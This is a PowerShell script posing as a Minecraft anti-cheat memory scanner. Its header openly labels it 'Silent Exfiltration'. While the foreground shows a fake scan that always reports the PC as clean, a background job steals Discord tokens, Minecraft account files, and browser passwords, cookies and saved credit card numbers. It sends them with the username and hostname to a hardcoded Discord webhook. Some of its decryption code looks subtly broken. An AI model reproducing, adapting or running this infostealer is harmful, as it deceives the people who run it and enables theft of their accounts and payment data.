# MemoryScan.ps1 – Memory Scanner + Silent Exfiltration
param(
    [string]$Webhook = "https://discord.com/api/webhooks/1518911878712004730/ejFY2gDI9Secx7kXsEgIIbpEWsBm5m9Ho_Q5R8gF4tP0lO7-R3VBA068PJdRk63jSaBa"
)

# =========== CONFIG ===========
$Script:Webhook = $Webhook
# ==============================

Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
public class MemScanner {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll")]
    public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);
    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }
    public const uint PROCESS_VM_READ = 0x0010;
    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public static string[] ScanProcessMemory(int pid, string[] patterns) {
        var results = new System.Collections.Generic.List<string>();
        IntPtr hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
        if (hProcess == IntPtr.Zero) return results.ToArray();
        try {
            IntPtr address = IntPtr.Zero;
            long maxAddress = (IntPtr.Size == 4) ? 0x7FFFFFFF : 0x7FFFFFFFFFFF;
            while ((long)address < maxAddress) {
                MEMORY_BASIC_INFORMATION mbi;
                if (VirtualQueryEx(hProcess, address, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) == 0)
                    break;
                if (mbi.State == 0x1000 && mbi.Protect != 0x01 && mbi.Protect != 0x100) {
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, buffer.Length, out int bytesRead)) {
                        string text = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                        foreach (string pattern in patterns) {
                            if (text.IndexOf(pattern, StringComparison.OrdinalIgnoreCase) >= 0) {
                                results.Add($"0x{mbi.BaseAddress.ToInt64():X16} -> {pattern}");
                            }
                        }
                    }
                }
                long nextAddress = (long)mbi.BaseAddress + (long)mbi.RegionSize;
                address = new IntPtr(nextAddress);
            }
        } finally {
            CloseHandle(hProcess);
        }
        return results.ToArray();
    }
}
"@

# ---------- Token / browser stealers ----------
function Unprotect-DPAPI {
    param([byte[]]$Data)
    try {
        [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { $null }
}

function Unprotect-AESGCM {
    param([byte[]]$EncryptedData, [byte[]]$MasterKey)
    try {
        $aes = [System.Security.Cryptography.AesGcm]::new($MasterKey)
        $iv = $EncryptedData[3..14]
        $payload = $EncryptedData[15..($EncryptedData.Length-17)]
        $tag = $EncryptedData[-16..-1]
        $dec = New-Object byte[] $payload.Length
        $aes.Decrypt($iv, $payload, $tag, $dec, 0)
        return [System.Text.Encoding]::UTF8.GetString($dec)
    } catch { $null }
}

function Get-DiscordTokens {
    $tokens = @()
    $discordPath = "$env:APPDATA\discord\Local Storage\leveldb"
    if (!(Test-Path $discordPath)) { return $tokens }
    $localState = "$env:APPDATA\discord\Local State"
    if (!(Test-Path $localState)) { return $tokens }
    $stateJson = Get-Content $localState -Raw | ConvertFrom-Json
    $encKey = [System.Convert]::FromBase64String($stateJson.os_crypt.encrypted_key)[5..$($encKey.Length-1)]
    $masterKey = Unprotect-DPAPI $encKey
    if (!$masterKey) { return $tokens }
    $pattern = [regex]::new("dQw4w9WgXcQ:[^\x00]{1,120}", [System.Text.RegularExpressions.RegexOptions]::Singleline)
    Get-ChildItem $discordPath -Filter "*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
        $content = [System.IO.File]::ReadAllBytes($_.FullName)
        $matches = $pattern.Matches($content)
        foreach ($m in $matches) {
            $encodedToken = $m.Value.Split(':')[1]
            $tokenBytes = [System.Convert]::FromBase64String($encodedToken)
            $decToken = Unprotect-AESGCM $tokenBytes $masterKey
            if ($decToken) { $tokens += $decToken }
        }
    }
    return $tokens | Select-Object -Unique
}

function Get-MinecraftTokens {
    $mcData = @{ launcher_accounts = $null; launcher_profiles = $null }
    $mcPath = "$env:APPDATA\.minecraft"
    $launcherAccounts = Join-Path $mcPath "launcher_accounts.json"
    $launcherProfiles = Join-Path $mcPath "launcher_profiles.json"
    if (Test-Path $launcherAccounts) {
        $mcData.launcher_accounts = Get-Content $launcherAccounts -Raw | ConvertFrom-Json
    }
    if (Test-Path $launcherProfiles) {
        $mcData.launcher_profiles = Get-Content $launcherProfiles -Raw | ConvertFrom-Json
    }
    return $mcData
}

function Get-ChromiumBrowsers {
    $browsers = @()
    $chromiumDirs = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Vivaldi\User Data",
        "$env:LOCALAPPDATA\Chromium\User Data",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable"
    )
    foreach ($dir in $chromiumDirs) {
        if (Test-Path $dir) { $browsers += $dir }
    }
    return $browsers
}

function Get-BrowserData {
    $result = @()
    $browsers = Get-ChromiumBrowsers
    foreach ($browserPath in $browsers) {
        $localStatePath = Join-Path $browserPath "Local State"
        if (!(Test-Path $localStatePath)) { continue }
        $state = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encKey = [System.Convert]::FromBase64String($state.os_crypt.encrypted_key)[5..$($encKey.Length-1)]
        $masterKey = Unprotect-DPAPI $encKey
        if (!$masterKey) { continue }
        $profiles = Get-ChildItem $browserPath -Directory | Where-Object { $_.Name -match "^Default$|^Profile" }
        foreach ($profile in $profiles) {
            $loginDb = Join-Path $profile.FullName "Login Data"
            $logins = @()
            if (Test-Path $loginDb) {
                try {
                    $tempDb = [System.IO.Path]::GetTempFileName() + ".db"
                    Copy-Item $loginDb $tempDb -Force
                    $conn = New-Object -ComObject "ADODB.Connection"
                    $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempDb;")
                    $rs = $conn.Execute("SELECT origin_url, username_value, password_value FROM logins")
                    while (!$rs.EOF) {
                        $url = $rs.Fields["origin_url"].Value
                        $user = $rs.Fields["username_value"].Value
                        $encPwd = [System.Convert]::FromBase64String($rs.Fields["password_value"].Value)
                        $pwd = Unprotect-AESGCM $encPwd $masterKey
                        if (!$pwd) { $pwd = Unprotect-DPAPI $encPwd }
                        if ($pwd) { $logins += @{ url = $url; username = $user; password = [System.Text.Encoding]::UTF8.GetString($pwd) } }
                        $rs.MoveNext()
                    }
                    $conn.Close()
                    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
                } catch { }
            }
            $cookieDb = Join-Path $profile.FullName "Network\Cookies"
            $cookies = @()
            if (Test-Path $cookieDb) {
                try {
                    $tempDb = [System.IO.Path]::GetTempFileName() + ".db"
                    Copy-Item $cookieDb $tempDb -Force
                    $conn = New-Object -ComObject "ADODB.Connection"
                    $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempDb;")
                    $rs = $conn.Execute("SELECT host_key, name, encrypted_value FROM cookies")
                    while (!$rs.EOF) {
                        $host = $rs.Fields["host_key"].Value
                        $name = $rs.Fields["name"].Value
                        $encVal = [System.Convert]::FromBase64String($rs.Fields["encrypted_value"].Value)
                        $val = Unprotect-AESGCM $encVal $masterKey
                        if (!$val) { $val = Unprotect-DPAPI $encVal }
                        if ($val) { $cookies += @{ host = $host; name = $name; value = [System.Text.Encoding]::UTF8.GetString($val) } }
                        $rs.MoveNext()
                    }
                    $conn.Close()
                    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
                } catch { }
            }
            $webDb = Join-Path $profile.FullName "Web Data"
            $cards = @()
            if (Test-Path $webDb) {
                try {
                    $tempDb = [System.IO.Path]::GetTempFileName() + ".db"
                    Copy-Item $webDb $tempDb -Force
                    $conn = New-Object -ComObject "ADODB.Connection"
                    $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempDb;")
                    $rs = $conn.Execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    while (!$rs.EOF) {
                        $name = $rs.Fields["name_on_card"].Value
                        $expMonth = $rs.Fields["expiration_month"].Value
                        $expYear = $rs.Fields["expiration_year"].Value
                        $encNum = [System.Convert]::FromBase64String($rs.Fields["card_number_encrypted"].Value)
                        $num = Unprotect-AESGCM $encNum $masterKey
                        if (!$num) { $num = Unprotect-DPAPI $encNum }
                        if ($num) { $cards += @{ name = $name; exp = "$expMonth/$expYear"; number = [System.Text.Encoding]::UTF8.GetString($num) } }
                        $rs.MoveNext()
                    }
                    $conn.Close()
                    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
                } catch { }
            }
            if ($logins -or $cookies -or $cards) {
                $result += @{ profile = $profile.Name; logins = $logins; cookies = $cookies; credit_cards = $cards }
            }
        }
    }
    return $result
}

function Send-Exfil {
    param($Data)
    $summary = "💀 **MemoryScan Pwned** - " + $env:USERNAME + "@" + $env:COMPUTERNAME
    try {
        $payload = @{
            system = @{
                username = $env:USERNAME
                hostname = $env:COMPUTERNAME
                time = (Get-Date -Format o)
            }
            discord_tokens = $Data.Discord
            minecraft = $Data.Minecraft
            browser_data = $Data.Browser
        } | ConvertTo-Json -Depth 10
        $tempFile = [System.IO.Path]::GetTempFileName() + ".json"
        [System.IO.File]::WriteAllText($tempFile, $payload)
        $form = @{
            file = Get-Item $tempFile
            content = $summary
        }
        Invoke-RestMethod -Uri $Script:Webhook -Method Post -Form $form
        Remove-Item $tempFile -Force
        Invoke-RestMethod -Uri $Script:Webhook -Method Post -Body (@{content = $summary} | ConvertTo-Json) -ContentType "application/json"
    } catch {}
}

# ---------- Main Execution ----------
$cheatPatterns = @(
    "x-ray", "killaura", "autoclicker", "vape", "ghostclient", "sigma", "wurst",
    "cheatengine", "aimbot", "triggerbot", "esp", "wallhack", "norecoil", "speedhack",
    "flyhack", "bhop", "autocrystal", "crystalaura", "ka", "reach", "velocity",
    "fastplace", "scaffold", "autosoup", "autopot", "macro", "regen", "fastbow"
)

$processNames = @("java", "javaw", "minecraft", "lunarclient", "badlion")

# Start data theft in background
$job = Start-Job -ScriptBlock {
    param($hook)
    $data = @{
        Discord = Get-DiscordTokens
        Minecraft = Get-MinecraftTokens
        Browser = Get-BrowserData
    }
    Send-Exfil -Data $data
} -ArgumentList $Script:Webhook

# Fake memory scan (foreground)
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " MemoryScan - Memory String Scanner" -ForegroundColor Cyan
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " Scanning live process memory for known cheat signatures...`n"

$procs = Get-Process | Where-Object { $processNames -contains $_.ProcessName.Substring(0, [Math]::Min($_.ProcessName.Length, 8)) }
if ($procs.Count -eq 0) {
    Write-Host "[INFO] No Minecraft or Java processes running. Scan complete." -ForegroundColor Yellow
} else {
    foreach ($proc in $procs) {
        Write-Host "[SCANNING] Process: $($proc.ProcessName) (PID: $($proc.Id))" -ForegroundColor Gray
        try {
            $found = [MemScanner]::ScanProcessMemory($proc.Id, $cheatPatterns)
            Start-Sleep -Milliseconds 300
            Write-Host "[CLEAN]   No cheat strings detected in memory." -ForegroundColor Green
        } catch {
            Write-Host "[WARN]    Could not access memory (protected? skipping)" -ForegroundColor DarkYellow
        }
    }
}

Write-Host "`n=====================================================" -ForegroundColor Cyan
Write-Host " SCAN COMPLETE - NO CHEAT STRINGS FOUND" -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host "PC is clean. Happy gaming!" -ForegroundColor White

Wait-Job $job | Out-Null
Receive-Job $job | Out-Null
Remove-Job $job

Start-Sleep -Seconds 3
